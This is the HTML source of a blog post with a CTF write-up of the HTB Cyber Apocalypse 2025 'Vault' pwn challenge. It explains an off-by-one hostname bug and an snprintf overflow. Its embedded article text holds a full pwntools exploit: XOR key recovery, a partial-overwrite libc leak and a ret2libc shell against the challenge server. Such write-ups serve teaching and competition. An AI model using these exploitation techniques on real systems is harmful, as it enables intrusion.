@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HTB Cyber Apocalypse 2025 - Vault | leo_something</title>
+<meta name="keywords" content="pwn, bof">
+<meta name="description" content="Hardest pwn challenge of the CTF. A simple vulnerability lead to a BOF, but the path to RCE was really interesting">
+<meta name="author" content="leo_something">
+<link rel="canonical" href="http://leo1.cc/posts/writeups/htb25-vault/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.62bb6a5e71ed8590b51185096e2d3dea8379889277e03fcf9ef8a01b0f6d9dc0.css" integrity="sha256-YrtqXnHthZC1EYUJbi096oN5iJJ34D/PnvigGw9tncA=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://leo1.cc/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://leo1.cc/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://leo1.cc/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://leo1.cc/apple-touch-icon.png">
+<link rel="mask-icon" href="http://leo1.cc/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://leo1.cc/posts/writeups/htb25-vault/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://leo1.cc/posts/writeups/htb25-vault/">
+  <meta property="og:site_name" content="leo_something">
+  <meta property="og:title" content="HTB Cyber Apocalypse 2025 - Vault">
+  <meta property="og:description" content="Hardest pwn challenge of the CTF. A simple vulnerability lead to a BOF, but the path to RCE was really interesting">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-02T09:00:00+00:00">
+    <meta property="article:modified_time" content="2025-04-02T09:00:00+00:00">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Bof">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB Cyber Apocalypse 2025 - Vault">
+<meta name="twitter:description" content="Hardest pwn challenge of the CTF. A simple vulnerability lead to a BOF, but the path to RCE was really interesting">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://leo1.cc/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HTB Cyber Apocalypse 2025 - Vault",
+      "item": "http://leo1.cc/posts/writeups/htb25-vault/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB Cyber Apocalypse 2025 - Vault",
+  "name": "HTB Cyber Apocalypse 2025 - Vault",
+  "description": "Hardest pwn challenge of the CTF. A simple vulnerability lead to a BOF, but the path to RCE was really interesting",
+  "keywords": [
+    "pwn", "bof"
+  ],
+  "articleBody": "Overview This challenge consists in an ELF binary that allows a user to store hostnames (URLs) and passwords, it provides the following features:\nAdd Entry: given a URL and a password it saves them in an array, encrypting the password with a randomly generated key View Entries: given an index the binary decrypts the password and prints it along with the URL NOTES: The “encryption” is a simple xor with the random key:\nv7 = pw_len - 1; if (pw_len \u003e 0 ) { do { password[i] ^= global_key[i \u0026 0x3F]; v8 = i++; }while ( v8 != v7 ); } URLs and passwords get saved in structs:\nstruct entry { char host[128]; char password[256]; size_t pw_len; }; These structs reside within a global array of size 9.\nVulnerabilities Before saving an hostname inside the array the URL gets parsed:\nchar *__fastcall parse_hostname(char *buf) { char *result; // rax char *hostname; // [rsp+18h] [rbp-28h] size_t len_hostname; // [rsp+20h] [rbp-20h] char *urll; // [rsp+30h] [rbp-10h] char *hostname_noport; // [rsp+38h] [rbp-8h] hostname = url; urll = strstr(url, \"://\"); if ( urll ) hostname = urll + 3; hostname_noport = strchr(hostname, ':'); if ( hostname_noport ) { len_hostname = hostname_noport - hostname; if ( (unsigned __int64)(hostname_noport - hostname) \u003e 0x80 ) len_hostname = 127LL; strncpy(buf, hostname, len_hostname); result = \u0026buf[len_hostname]; buf[len_hostname] = 0; } else { strncpy(buf, hostname, 0x80uLL); result = buf + 127; buf[127] = 0; } return result; } url is a global string of size 256 bytes that contains the inputted URL.\nWhat this function does is simply extracting the hostname from a URL, removing the protocol and the port (if present) and saving it inside buf . For example: https://leo1.cc:443 -\u003e leo1.cc\nAs buf is 128 bytes long (it’s basically entry.host within the struct), if the length of the hostname is exactly 128 bytes + “:” it passes the size check but gets null-terminated in the 129th byte. This is due to the (hostname_noport - hostname) \u003e 0x80, which should have been \u003e= 0x80. As the password is saved in the struct after the hostname, the null byte of the latter gets overwritten by the password itself. This leads to a buffer overflow in the view_entries function.\nLet’s take a step back and look more closely at the view_entries function.\nchar msg[384]; ... entry = \u0026entries[idx]; password = entry-\u003epassword; msg_size = snprintf(msg, 0x180uLL, \"Hostname: %s\\nPassword: \", entry-\u003ehost); pw_len = entry-\u003epw_len; v4 = \u0026msg[msg_size]; pw_space = 384LL - msg_size; i = 0LL; v7 = pw_len - 1; // in-memory xor if (pw_len \u003e 0 ) { do { password[i] ^= global_key[i \u0026 0x3F]; v8 = i++; } while ( v8 != v7 ); } pw_len_1 = strlen(password); if ( pw_len_1 \u003e pw_space ) pw_len_1 = pw_space; memcpy(v4, password, pw_len_1); // memcpy is just for semplification msg[383] = 0; puts(msg); What this code does is it prepares the msg buffer and then prints it. This is a weird approach and stands out. Also note that the password is appended to the buffer and that this is done using msg_size, the return value of snprintf. As we created an hostname which is not null-terminated (so it’s basically the concatenation of hostname and password), msg_size can be bigger than 384, leading to an overflow.\nThe reason is written in the man page of snprintf:\nIf the output was truncated due to this limit then the return value is the number of characters (excluding the terminating null byte) which would have been written to the final string if enough space had been available. As v4 = \u0026msg[msg_size]; the password can be written at an offset from the end of msg on the stack, jumping even the the canary if we want!\nExploitation Overflowing the stack Based on these vulnerabilities I wrote a simple payload to override stuff after the canary with some good old “A\"s.\nhostname = b\"B\"*128 + b\":\" password = b\"A\"*255 What happens here is that the length returned by snprintf is greater than the size of msg, so our password gets written just after the canary. But now, what’s after the canary?\nWell, some saved registers and the return address of course!\npop rbx pop r12 pop r13 pop r14 pop r15 retn 00:0000│ 0x7fffffffe4f8 ◂— 0x34e276c4e7dbf600 01:0008│ rsp 0x7fffffffe500 —▸ 0x7fffffffe534 ◂— 0xe7dbf60000000002 02:0010│ 0x7fffffffe508 —▸ 0x555555556650 ◂— 0x632a25642500203e /* '\u003e ' */ 03:0018│ 0x7fffffffe510 —▸ 0x555555556648 ◂— 0x74697845202e33 /* '3. Exit' */ 04:0020│ 0x7fffffffe518 —▸ 0x555555556638 ◂— '2. View Entries' 05:0028│ 0x7fffffffe520 —▸ 0x55555555662b ◂— '1. Add Entry' 06:0030│ 0x7fffffffe528 —▸ 0x555555555327 ◂— jmp 0x555555555250 As you can see these registers contain char* that will be used to print the banner in the main function.\nLeaking libc These saved registers are really useful when it comes to leaking stuff, as we can partially override one of those to make it point to a libc address somewhere inside the binary and leak it! This requires 4 bits of brute-force, due to the fact that the nearest libc address to one of those strings resides in the GOT section of the binary, so we need to perform a partial-override of 2 bytes. ASLR is enabled and it randomizes every bit of the address, except the last 12, that’s why we need to brute-force the remaining 4 bits.\nIt turns out that we cannot simply write a payload like\nhostname = b\"A\"*128 + b\":\" password = p16(0x7F70) # partial override This is because the password is not long enough to trigger the overflow. We cannot add stuff after the password, otherwise we would break the partial-override, so now what?\nWell, xor comes to the rescue! The xor mechanism works as sort of toggle: every time an entry gets viewed the password is xored in memory. This means that viewing an entry twice will leak the xored password and, as we obviously know the original password, we can leak the key.\nr = conn() add_entry(r,b\"A\" * 255, b\"B\" * 255) view_entry(r,0) # view first time hostname, password = view_entry(r,0) # view second time key = xor(password, b\"B\" * 255)[:64] Now we can write an encrypted payload that upon decryption contains null bytes\npassword = p16(0x7F70) + b\"\\x00\"*253 # requires 4 bit bruteforce (0x7) password = xor(password, key)[:3] + b\"a\"*252 This way we can submit a 255 bytes long password to scanf, but when viewing it it’ll get xored with the key and become our partial-override payload! Avoid scanf headaches This approach is not entirely reliable as sometimes xor(password, key) contains characters that stop the scanf. To avoid headaches I wrote a script to find these characters (yeah, I could have RTFM, but this way was faster).\nfor i in range(256): r = conn() r.sendlineafter(b\"\u003e\", b\"1\") r.sendlineafter(b\":\", b\"a\") payload = b\"a\" + i.to_bytes() + b\"a\" r.sendlineafter(b\":\", payload) r.recvuntil(b\"\u003e\") if r.recvuntil(b\"\u003e\", timeout=0.1) != b\"\": print(i.to_bytes().hex()) r.close() And the result was the following:\nassert b\"\\x00\" not in payload assert b\"\\x0a\" not in payload assert b\"\\x0d\" not in payload assert b\"\\x0b\" not in payload assert b\"\\x0c\" not in payload assert b\"\\x20\" not in payload assert b\"\\x09\" not in payload The tedious path to RCE With a libc leak and the ability to override the return address it should be easy to achieve RCE, right? Well, no.\nWe are not allowed to write more than one null byte in our payload, that’s because the first one terminates the password string:\npw_len_1 = strlen(password); if ( pw_len_1 \u003e pw_space ) pw_len_1 = pw_space; memcpy(v4, password, pw_len_1); strlen calculates the length of a null-terminated string, so no chance of writing multiple null bytes.\nSo now it’s gadget time :/\nUpon returning from view_entries the registers are set as follows: 0xdeaddeadbeef is our fake return address, but we also control r12, r13, r14, r15 thanks to the 5 pops before return. As I explained above the values of these registers can’t contain null bytes, otherwise it terminates the string and the next part of the payload won’t be written.\nUnfortunately there are no onegadgets that work, mainly because rbp is set to 1. 5 In the end I came across a really interesting thing: looking at the disassembly of do_system I noticed that it moves the first argument (rdi) inside rbx before using it.\npwndbg\u003e disass do_system Dump of assembler code for function do_system: 0x00007ffff7c50900 \u003c+0\u003e:\tpush r15 ... 0x00007ffff7c5092b \u003c+43\u003e:\tmov rbx,rdi ... This gave me an idea, what if that depends on the compiler and every libc function does that before using the contents of rdi?\nLooking at gets it turns out it does!\npwndbg\u003e disass gets Dump of assembler code for function _IO_gets: Address range 0x7ffff7c80520 to 0x7ffff7c80699: 0x00007ffff7c80520 \u003c+0\u003e:\tendbr64 0x00007ffff7c80524 \u003c+4\u003e:\tpush r13 0x00007ffff7c80526 \u003c+6\u003e:\tpush r12 0x00007ffff7c80528 \u003c+8\u003e:\tpush rbp 0x00007ffff7c80529 \u003c+9\u003e:\tpush rbx 0x00007ffff7c8052a \u003c+10\u003e:\tmov rbx,rdi // MOVES RDI in RBX!!! 0x00007ffff7c8052d \u003c+13\u003e:\tsub rsp,0x18 As rbx points on the stack just after rsp, if we jump at gets+13 we are basically calling gets(rbx) and writing on the stack frame of gets. We can override it’s return address and create a ret2libc payload. We aren’t restricted by null bytes this time!\nFinal expolit #!/usr/bin/env python3 from pwn import * exe = ELF(\"vault_patched\") libc = ELF(\"glibc/libc.so.6\") ld = ELF(\"./ld-2.35.so\") context.binary = exe context.terminal = [\"alacritty\", \"-e\"] NC_CMD = \"nc 94.237.59.147 52373\" gdbscript = \\ \"\"\" breakrva 0x1843 \"\"\" def conn(): if args.LOCAL: r = process([exe.path]) elif args.GDB: r = gdb.debug([exe.path], gdbscript=gdbscript, aslr=False) else: r = remote(NC_CMD.split(\" \")[1], int(NC_CMD.split(\" \")[2])) return r def add_entry(r, url: bytes, password: bytes): sleep(0.1) r.sendline(b\"1\") r.sendlineafter(b\"URL: \", url) r.sendlineafter(b\"Password: \", password) def view_entry(r, index: int): sleep(0.1) r.sendline(b\"2\") r.sendlineafter(b\"Index: \", str(index).encode(\"ascii\")) r.recvuntil(b\"Hostname: \") hostname = r.recvline().strip() r.recvuntil(b\"Password: \") password = r.recvline() return hostname, password def main(): r = conn() add_entry(r,b\"A\" * 255, b\"B\" * 255) view_entry(r,0) hostname, password = view_entry(r,0) key = xor(password, b\"B\" * 255)[:64] log.success(f\"key: {key.hex()}\") # insert a password 255 chars long that xored with the key results in a \\x00 at position 3 payload = p16(0x7F70) + b\"\\x00\"*253 payload = xor(payload, key)[:3] + b\"a\"*252 assert b\"\\x00\" not in payload assert b\"\\x0a\" not in payload assert b\"\\x0d\" not in payload assert b\"\\x0b\" not in payload assert b\"\\x0c\" not in payload assert b\"\\x20\" not in payload assert b\"\\x09\" not in payload print(payload) add_entry(r, b\"A\" * 128 + b\":\", payload) hostname, password = view_entry(r, 1) r.sendlineafter(b\"\u003e \", b\"2\") r.sendlineafter(b\"Index: \", str(1).encode(\"ascii\")) r.recvuntil(b\"Exit\\n\") libc.address = u64(r.recv(6) + b\"\\x00\"*2) - 0x80e50 log.warning(f\"libc: {hex(libc.address)}\") payload = b\"G\"*32 + p64(libc.sym.gets+13)[:6] + b\"\\x00\"*217 payload = xor(payload, key)[:39] + b\"a\"*216 assert b\"\\x00\" not in payload assert b\"\\x0a\" not in payload assert b\"\\x0d\" not in payload assert b\"\\x0b\" not in payload assert b\"\\x0c\" not in payload assert b\"\\x20\" not in payload assert b\"\\x09\" not in payload add_entry(r, b\"A\" * 128 + b\":\", payload) hostname, password = view_entry(r, 2) sleep(0.1) r.sendline(b\"2\\n2\") sleep(0.1) POP_RDI = libc.address + 0x000000000002a3e5 RET = libc.address + 0x00000000000f410b BINSH = libc.address + 0x1d8678 ret2libc = b\"A\"*28 + flat(POP_RDI, BINSH, libc.sym.system) r.sendline(ret2libc) sleep(0.1) r.sendline(\"ls\") r.sendline(\"cat flag.txt\") r.interactive() if __name__ == \"__main__\": main() FLAG: HTB{Fm7_S7r1Ng_T0_0n3_G4dG37_1S_Th3_1337_W4y}\nIntended solve As the flag suggests this was not the intended solution. From what I understood after the end of the CTF the intended way of exploiting the overflow was to mess with the printf used in the main function by making r12 point to some user inputted format string payload.\n",
+  "wordCount" : "1870",
+  "inLanguage": "en",
+  "datePublished": "2025-04-02T09:00:00Z",
+  "dateModified": "2025-04-02T09:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "leo_something"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://leo1.cc/posts/writeups/htb25-vault/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "leo_something",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://leo1.cc/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://leo1.cc/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      HTB Cyber Apocalypse 2025 - Vault
+    </h1>
+    <div class="post-meta"><span title='2025-04-02 09:00:00 +0000 UTC'>April 2, 2025</span>&nbsp;·&nbsp;leo_something
+
+</div>
+  </header>
+  <div class="tags" style="padding: 2px;">
+    <div style="display: flex; flex-wrap: wrap; gap: 5px;">
+      
+      <a href="/tags/pwn" class="custom-tag">
+        pwn
+      </a>
+      
+      <a href="/tags/bof" class="custom-tag">
+        bof
+      </a>
+      
+    </div>
+  </div>
+
+  <div style="height: var(--gap);"></div> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#vulnerabilities" aria-label="Vulnerabilities">Vulnerabilities</a></li>
+                <li>
+                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
+                        
+                <li>
+                    <a href="#overflowing-the-stack" aria-label="Overflowing the stack">Overflowing the stack</a></li>
+                <li>
+                    <a href="#leaking-libc" aria-label="Leaking libc">Leaking libc</a><ul>
+                        
+                <li>
+                    <a href="#avoid-scanf-headaches" aria-label="Avoid scanf headaches">Avoid scanf headaches</a></li></ul>
+                </li>
+                <li>
+                    <a href="#the-tedious-path-to-rce" aria-label="The tedious path to RCE">The tedious path to RCE</a></li>
+                <li>
+                    <a href="#final-expolit" aria-label="Final expolit">Final expolit</a></li>
+                <li>
+                    <a href="#intended-solve" aria-label="Intended solve">Intended solve</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>This challenge consists in an ELF binary that allows a user to store hostnames (URLs) and passwords, it provides the following features:</p>
+<ul>
+<li><code>Add Entry</code>: given a URL and a password it saves them in an array, encrypting the password with a randomly generated key</li>
+<li><code>View Entries</code>: given an index the binary decrypts the password and prints it along with the URL</li>
+</ul>
+<p><strong>NOTES:</strong>
+The &ldquo;encryption&rdquo; is a simple xor with the random key:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v7 <span style="color:#f92672">=</span> pw_len <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (pw_len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> ) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>	  password[i] <span style="color:#f92672">^=</span> global_key[i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3F</span>];
+</span></span><span style="display:flex;"><span>	  v8 <span style="color:#f92672">=</span> i<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>	}<span style="color:#66d9ef">while</span> ( v8 <span style="color:#f92672">!=</span> v7 );
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>URLs and passwords get saved in structs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> entry {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> host[<span style="color:#ae81ff">128</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> password[<span style="color:#ae81ff">256</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">size_t</span> pw_len;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>These structs reside within a global array of size 9.</p>
+<h2 id="vulnerabilities">Vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#vulnerabilities">#</a></h2>
+<p>Before saving an hostname inside the array the URL gets parsed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">parse_hostname</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>result; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>hostname; <span style="color:#75715e">// [rsp+18h] [rbp-28h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> len_hostname; <span style="color:#75715e">// [rsp+20h] [rbp-20h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>urll; <span style="color:#75715e">// [rsp+30h] [rbp-10h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>hostname_noport; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  hostname <span style="color:#f92672">=</span> url;
+</span></span><span style="display:flex;"><span>  urll <span style="color:#f92672">=</span> <span style="color:#a6e22e">strstr</span>(url, <span style="color:#e6db74">&#34;://&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( urll )
+</span></span><span style="display:flex;"><span>    hostname <span style="color:#f92672">=</span> urll <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>  hostname_noport <span style="color:#f92672">=</span> <span style="color:#a6e22e">strchr</span>(hostname, <span style="color:#e6db74">&#39;:&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( hostname_noport )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    len_hostname <span style="color:#f92672">=</span> hostname_noport <span style="color:#f92672">-</span> hostname;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)(hostname_noport <span style="color:#f92672">-</span> hostname) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x80</span> )
+</span></span><span style="display:flex;"><span>      len_hostname <span style="color:#f92672">=</span> <span style="color:#ae81ff">127LL</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strncpy</span>(buf, hostname, len_hostname);
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>buf[len_hostname];
+</span></span><span style="display:flex;"><span>    buf[len_hostname] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strncpy</span>(buf, hostname, <span style="color:#ae81ff">0x80uLL</span>);
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">127</span>;
+</span></span><span style="display:flex;"><span>    buf[<span style="color:#ae81ff">127</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>url</code> is a global string of size 256 bytes that contains the inputted URL.</p>
+<p>What this function does is simply extracting the hostname from a URL, removing the protocol and the port (if present) and saving it inside <code>buf</code> .
+For example: <code>https://leo1.cc:443</code> -&gt; <code>leo1.cc</code></p>
+<p>As <code>buf</code> is 128 bytes long (it&rsquo;s basically <code>entry.host</code> within the struct), if the length of the hostname is exactly 128 bytes + &ldquo;:&rdquo; it passes the size check but gets null-terminated in the 129th byte. This is due to the <code>(hostname_noport - hostname) &gt; 0x80</code>, which should have been <code>&gt;= 0x80</code>.
+As the password is saved in the struct after the hostname, the null byte of the latter gets overwritten by the password itself.
+This leads to a buffer overflow in the <code>view_entries</code> function.</p>
+<p>Let&rsquo;s take a step back and look more closely at the <code>view_entries</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> msg[<span style="color:#ae81ff">384</span>];
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>entry <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>entries[idx];
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> entry<span style="color:#f92672">-&gt;</span>password;
+</span></span><span style="display:flex;"><span>msg_size <span style="color:#f92672">=</span> <span style="color:#a6e22e">snprintf</span>(msg, <span style="color:#ae81ff">0x180uLL</span>, <span style="color:#e6db74">&#34;Hostname:  %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Password:    &#34;</span>, entry<span style="color:#f92672">-&gt;</span>host);
+</span></span><span style="display:flex;"><span>pw_len <span style="color:#f92672">=</span> entry<span style="color:#f92672">-&gt;</span>pw_len;
+</span></span><span style="display:flex;"><span>v4 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>msg[msg_size];
+</span></span><span style="display:flex;"><span>pw_space <span style="color:#f92672">=</span> <span style="color:#ae81ff">384LL</span> <span style="color:#f92672">-</span> msg_size;
+</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>v7 <span style="color:#f92672">=</span> pw_len <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// in-memory xor
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (pw_len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> ) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>	  password[i] <span style="color:#f92672">^=</span> global_key[i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3F</span>];
+</span></span><span style="display:flex;"><span>	  v8 <span style="color:#f92672">=</span> i<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> ( v8 <span style="color:#f92672">!=</span> v7 );
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pw_len_1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(password);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( pw_len_1 <span style="color:#f92672">&gt;</span> pw_space )
+</span></span><span style="display:flex;"><span>	pw_len_1 <span style="color:#f92672">=</span> pw_space;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(v4, password, pw_len_1); <span style="color:#75715e">// memcpy is just for semplification
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>msg[<span style="color:#ae81ff">383</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">puts</span>(msg);
+</span></span></code></pre></div><p>What this code does is it prepares the <code>msg</code> buffer and then prints it.
+This is a weird approach and stands out. Also note that the password is appended to the buffer and that this is done using <code>msg_size</code>, the return value of <code>snprintf</code>.
+As we created an hostname which is not null-terminated (so it&rsquo;s basically the concatenation of hostname and password), <code>msg_size</code> can be bigger than 384, leading to an overflow.</p>
